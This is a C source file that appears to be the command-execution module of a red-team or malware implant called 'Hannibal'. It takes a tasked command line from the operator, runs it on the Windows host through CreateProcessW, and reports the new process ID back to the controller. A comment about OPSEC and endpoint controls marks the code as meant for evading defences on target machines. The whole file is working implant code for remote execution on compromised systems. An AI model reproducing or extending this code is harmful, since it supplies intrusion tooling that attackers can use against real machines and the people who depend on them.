#include "config.h"

#ifdef INCLUDE_CMD_EXECUTE

#include "hannibal_tasking.h"

/**
 * CreateProcess has serious OPSEC considerations if target machine has endpoint controls.
 */
SECTION_CODE void cmd_execute(TASK t)
{
    HANNIBAL_INSTANCE_PTR

    CMD_EXECUTE *exec = (CMD_EXECUTE *)t.cmd;
    LPCWSTR path = exec->path;
    
    PROCESS_INFORMATION pi = {0};
    STARTUPINFOW si = {0};
    si.cb = sizeof(si);

    if (!hannibal_instance_ptr->Win32.CreateProcessW(
            NULL,           // No module name (use command line) 
            path,           // Command line
            NULL,           // Process handle not inheritable
            NULL,           // Thread handle not inheritable
            FALSE,          // Set handle inheritance to FALSE
            0,              // No creation flags
            NULL,           // Use parent's environment block
            NULL,           // Use parent's starting directory 
            &si,            // Pointer to STARTUPINFO structure
            &pi             // Pointer to PROCESS_INFORMATION structure
        )            
    ) {
        // return;
    }

    WCHAR new_pid[20] = {0};
    dword_to_wchar(pi.dwProcessId, new_pid, 10);

    hannibal_instance_ptr->Win32.CloseHandle(pi.hProcess);
    hannibal_instance_ptr->Win32.CloseHandle(pi.hThread);
    
    hannibal_response(new_pid, t.task_uuid);

    hannibal_instance_ptr->Win32.VirtualFree(exec->path, 0, MEM_RELEASE);
    hannibal_instance_ptr->Win32.VirtualFree(t.cmd, 0, MEM_RELEASE);
    
}

#endif